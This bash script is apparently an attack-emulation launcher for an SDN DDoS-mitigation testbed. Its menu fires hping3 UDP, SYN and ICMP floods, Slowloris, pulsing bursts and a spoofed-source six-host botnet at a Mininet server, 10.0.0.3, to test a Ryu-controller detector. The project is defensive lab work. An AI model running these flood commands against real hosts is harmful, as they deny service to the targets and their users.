#!/bin/bash
# ==============================================================================
# SDN DDoS Attack Emulation Suite & Interactive Launchpad
# ==============================================================================
# Provides unified emulation commands for:
#   1. Volumetric UDP Flood (Fast DDoS, high bandwidth)
#   2. TCP SYN Flood (L4 Handshake Exhaustion)
#   3. Slowloris / Low-and-Slow HTTP DoS (Application-layer starvation)
#   4. ICMP Echo / Ping Flood (Smurf / ICMP volumetric)
#   5. Pulsing / Periodic Burst Attack (Dynamic recovery test)
#   6. Multi-Source Botnet Attack (Simultaneous assault from h2, h4-h8)
#   7. Stop Attack Traffic (Halts attacks; retains legitimate stream)
#   8. Stop All Traffic (Halts attacks AND legitimate stream)
#   9. Start Legitimate User Stream (h1 -> h3 @ ~850 pkts/s baseline)
#  10. Dynamic Mixed Traffic Suite (3 diverse legitimate users + 6 botnet attackers)
# ==============================================================================

TARGET_IP="10.0.0.3"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BOTNET_PID_FILE="/tmp/sdn_botnet_pids"

# Determine privilege requirement: inside Mininet namespaces, EUID is 0 (root).
if [ "$EUID" -eq 0 ]; then
    SUDO=""
else
    SUDO="sudo"
fi

print_header() {
    clear
    echo "======================================================================"
    echo "       SDN DDOS MITIGATION — ATTACK EMULATION LAUNCHPAD               "
    echo "======================================================================"
    echo " Target Server : $TARGET_IP (Host h3)"
    echo " Detection     : Tier-1 CIC-DDoS2019 Decision Tree (Ryu Controller)"
    echo " Environment   : $([ "$EUID" -eq 0 ] && echo "Mininet Host / Root" || echo "Host VM (non-root)")"
    echo "======================================================================"

    # Verify reachability to target server
    if ! ping -c 1 -W 1 "$TARGET_IP" >/dev/null 2>&1; then
        echo " [!] NOTICE: 10.0.0.3 is not reachable directly from this shell."
        echo " [*] Make sure Mininet is running (sudo python3 network/topo_botnet.py)"
        echo " [*] To send traffic through Open vSwitch s1, launch this inside Mininet:"
        echo "     mininet> h2 bash network/attack_menu.sh"
        echo "======================================================================"
    fi
    echo ""
}

show_menu() {
    echo "Select an attack vector to launch:"
    echo "  [1] Fast Volumetric UDP Flood       (hping3 --flood --udp -p 80)"
    echo "  [2] TCP SYN Handshake Flood         (hping3 --flood -S -p 80)"
    echo "  [3] Slowloris Low-and-Slow HTTP DoS (python3 slowloris.py 150 conns)"
    echo "  [4] High-Rate ICMP Ping Flood       (hping3 --flood --icmp)"
    echo "  [5] Dynamic Pulsing / Wave Attack   (10s ON / 5s OFF bursts)"
    echo "  [6] Coordinated Multi-IP Botnet     (Launches h2, h4-h8 simultaneously)"
    echo "  [7] Stop Attack Traffic             (Halts attacks; retains legitimate stream)"
    echo "  [8] Stop All Traffic                (Halts attacks AND legitimate traffic)"
    echo "  [9] Start Legitimate User Stream    (h1 -> h3 @ ~850 pkts/s baseline)"
    echo "  [10] Dynamic Mixed Traffic Suite    (3 diverse legitimate users + 6 botnet attackers)"
    echo "  [0] Exit"
    echo ""
    read -p "Enter choice [0-10]: " choice
}

ensure_legit_traffic() {
    if ! pgrep -f "hping3.*5001" >/dev/null 2>&1 && ! pgrep -f "iperf.*10.0.0.3" >/dev/null 2>&1; then
        echo "[*] [AUTO-START] Bootstrapping background legitimate user stream (10.0.0.1 -> 10.0.0.3 @ ~850 pkts/s)..."
        $SUDO hping3 -a 10.0.0.1 --udp -p 5001 -i u1176 "$TARGET_IP" >/dev/null 2>&1 &
        sleep 0.5
    fi
}

stop_attacks() {
    echo "[*] Terminating all active attack processes..."
    if [ -f "$BOTNET_PID_FILE" ]; then
        while read -r pid; do
            [ -n "$pid" ] && kill -9 "$pid" 2>/dev/null
        done < "$BOTNET_PID_FILE"
        rm -f "$BOTNET_PID_FILE"
    fi
    $SUDO pkill -9 -f "hping3.*--flood" 2>/dev/null
    $SUDO pkill -9 -f "hping3.*u100" 2>/dev/null
    $SUDO pkill -9 -f "slowloris.py" 2>/dev/null
    echo "[+] Attack traffic halted. Legitimate user stream remains active."
}

stop_all() {
    stop_attacks
    echo "[*] Terminating legitimate traffic streams..."
    $SUDO pkill -9 -f "hping3" 2>/dev/null
    $SUDO pkill -9 -f "iperf -c" 2>/dev/null
    echo "[+] All traffic halted."
}

case_launch() {
    case $1 in
        1)
            ensure_legit_traffic
            echo "[!] Launching Volumetric UDP Flood against $TARGET_IP:80..."
            echo "Press Ctrl+C to abort attack."
            trap 'echo ""; echo "[*] Attack stopped by user."; return 0' INT
            $SUDO hping3 --flood --udp -p 80 "$TARGET_IP"
            trap - INT
            ;;
        2)
            ensure_legit_traffic
            echo "[!] Launching TCP SYN Flood against $TARGET_IP:80..."
            echo "Press Ctrl+C to abort attack."
            trap 'echo ""; echo "[*] Attack stopped by user."; return 0' INT
            $SUDO hping3 --flood -S -p 80 "$TARGET_IP"
            trap - INT
            ;;
        3)
            ensure_legit_traffic
            echo "[!] Launching Slowloris Low-and-Slow Attack against $TARGET_IP:80..."
            echo "Press Ctrl+C to abort attack."
            trap 'echo ""; echo "[*] Attack stopped by user."; return 0' INT
            python3 "$SCRIPT_DIR/slowloris.py" "$TARGET_IP" 80 150
            trap - INT
            ;;
        4)
            ensure_legit_traffic
            echo "[!] Launching ICMP Ping Flood against $TARGET_IP..."
            echo "Press Ctrl+C to abort attack."
            trap 'echo ""; echo "[*] Attack stopped by user."; return 0' INT
            $SUDO hping3 --flood --icmp "$TARGET_IP"
            trap - INT
            ;;
        5)
            ensure_legit_traffic
            echo "[!] Launching Dynamic Pulsing Attack against $TARGET_IP (10s flood / 5s pause)..."
            echo "Press Ctrl+C to stop."
            trap 'echo ""; echo "[*] Pulsing attack stopped by user."; return 0' INT
            while true; do
                echo "[*] [PULSE ON] Flooding $TARGET_IP with UDP for 10s..."
                $SUDO timeout 10 hping3 --flood --udp -p 80 "$TARGET_IP" 2>/dev/null
                echo "[*] [PULSE OFF] Sleeping for 5s to allow controller recovery..."
                sleep 5
            done
            trap - INT
            ;;
        6)
            ensure_legit_traffic
            echo "[!] Launching Distributed Botnet Assault across 6 IP addresses..."
            echo "    -> Node h2 (10.0.0.2): Volumetric UDP Flood (port 80)"
            echo "    -> Node h4 (10.0.0.4): TCP SYN Handshake Flood (port 80)"
            echo "    -> Node h5 (10.0.0.5): Slowloris HTTP Connection Starvation"
            echo "    -> Node h6 (10.0.0.6): High-Rate ICMP Flood"
            echo "    -> Node h7 (10.0.0.7): HTTP Port 8080 UDP Flood"
            echo "    -> Node h8 (10.0.0.8): DNS Port 53 UDP Flood"
            
            # Clean any old botnet processes first
            rm -f "$BOTNET_PID_FILE"
            
            # Spawn high-rate distributed attack streams (10,000 pkts/s per node = 60,000 pkts/s aggregate)
            $SUDO hping3 -a 10.0.0.2 -i u100 --udp -p 80 "$TARGET_IP" >/dev/null 2>&1 &
            echo $! >> "$BOTNET_PID_FILE"

            $SUDO hping3 -a 10.0.0.4 -i u100 -S -p 80 "$TARGET_IP" >/dev/null 2>&1 &
            echo $! >> "$BOTNET_PID_FILE"

            $SUDO hping3 -a 10.0.0.6 -i u100 --icmp "$TARGET_IP" >/dev/null 2>&1 &
            echo $! >> "$BOTNET_PID_FILE"

            $SUDO hping3 -a 10.0.0.7 -i u100 --udp -p 8080 "$TARGET_IP" >/dev/null 2>&1 &
            echo $! >> "$BOTNET_PID_FILE"

            $SUDO hping3 -a 10.0.0.8 -i u100 --udp -p 53 "$TARGET_IP" >/dev/null 2>&1 &
            echo $! >> "$BOTNET_PID_FILE"

            python3 "$SCRIPT_DIR/slowloris.py" "$TARGET_IP" 80 80 >/dev/null 2>&1 &
            echo $! >> "$BOTNET_PID_FILE"
            
            echo ""
            echo "[+] Distributed Botnet active in background alongside legitimate user traffic!"
            echo "Observe the React Dashboard: All attacker IPs are blocked, while legitimate h1 traffic is forwarded."
            echo "To halt botnet: Select Option [7] (Stop Attack Traffic)."
            pause_prompt
            ;;
        7)
            stop_attacks
            pause_prompt
            ;;
        8)
            stop_all
            pause_prompt
            ;;
        9)
            echo "[*] Launching legitimate user stream from h1 to h3 (Server: $TARGET_IP)..."
            ensure_legit_traffic
            echo "[+] Legitimate user stream (~850 pkts/s) active in background!"
            echo "Inspect the React Dashboard to observe Clean Forwarded traffic green line passing through."
            pause_prompt
            ;;
        10)
            echo "[*] Launching Dynamic Mixed Traffic Suite (Diverse Legitimate Users + Diverse Botnet)..."
            python3 "$SCRIPT_DIR/dynamic_traffic_suite.py" --mode botnet
            ;;
        0)
            exit 0
            ;;
        *)
            echo "Invalid selection."
            sleep 1
            ;;
    esac
}

pause_prompt() {
    if [ -z "$NON_INTERACTIVE" ] && [ -t 0 ]; then
        read -p "Press Enter to return to menu..."
    fi
}

# Check for non-interactive CLI argument (e.g., ./attack_menu.sh 1)
if [ -n "$1" ]; then
    NON_INTERACTIVE=1
    case_launch "$1"
    exit 0
fi

# Interactive loop
while true; do
    print_header
    show_menu
    case_launch "$choice"
done
